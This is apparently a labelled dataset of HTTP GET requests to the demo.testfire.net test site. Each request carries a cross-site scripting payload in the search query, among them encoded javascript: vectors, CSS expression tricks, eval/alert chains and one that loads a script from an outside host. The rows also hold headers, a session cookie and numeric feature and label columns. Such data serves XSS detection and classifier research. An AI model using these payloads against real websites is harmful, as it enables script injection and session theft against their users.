GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=`javascript:alert(""RSnake says### 'XSS'"")`>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,316
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS')""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,290
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(&quot;XSS&quot;)>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,280
GET,"http://demo.testfire.net/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,311
GET,"http://demo.testfire.net/search.jsp?query=<IMG DYNSRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,309
GET,"http://demo.testfire.net/search.jsp?query=<IMG LOWSRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,302
GET,"http://demo.testfire.net/search.jsp?query=exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,301
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC='vbscript:msgbox(""XSS"")'>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,"http://demo.testfire.net/search.jsp?query=<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,297
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,318
GET,"http://demo.testfire.net/search.jsp?query=<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,315
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,310
GET,"http://demo.testfire.net/search.jsp?query=<IMGSRC=""javascript:alert('XSS')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310
GET,http://demo.testfire.net/search.jsp?query=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,301
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC="" &#14;  javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300
GET,"http://demo.testfire.net/search.jsp?query=<XSS STYLE=""xss:expression(alert('XSS'))"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295
GET,"http://demo.testfire.net/search.jsp?query=<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,293
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,286
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,288
GET,"http://demo.testfire.net/search.jsp?query=<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,286
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,285
GET,"http://demo.testfire.net/search.jsp?query=firefoxurl:test|"" -new-window javascript:alert(\'Cross%20Browser%20Scripting!\');""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,274
GET,http://demo.testfire.net/search.jsp?query=res://c:\\program files\\adobe\\acrobat 7.0\\acrobat\\acrobat.dll/#2/#210,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,281
GET,"http://demo.testfire.net/search.jsp?query=>""'><img src=""javascript:alert(' XSS')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,283
GET,http://demo.testfire.net/search.jsp?query=alert(1),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,273
GET,http://demo.testfire.net/search.jsp?query=A=alert;A(1),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,344
GET,http://demo.testfire.net/search.jsp?query=+alert(0)+,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,342
GET,"http://demo.testfire.net/search.jsp?query=';//a=eval;b=alert;a(b(9));//","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,340
GET,http://demo.testfire.net/search.jsp?query=a=1;a=eval;b=alert;a(b(11));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,335
GET,http://demo.testfire.net/search.jsp?query='};a=eval;b=alert;a(b(13));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,278
GET,http://demo.testfire.net/search.jsp?query=1};a=eval;b=alert;a(b(14));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,286
GET,http://demo.testfire.net/search.jsp?query='];a=eval;b=alert;a(b(15));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,279
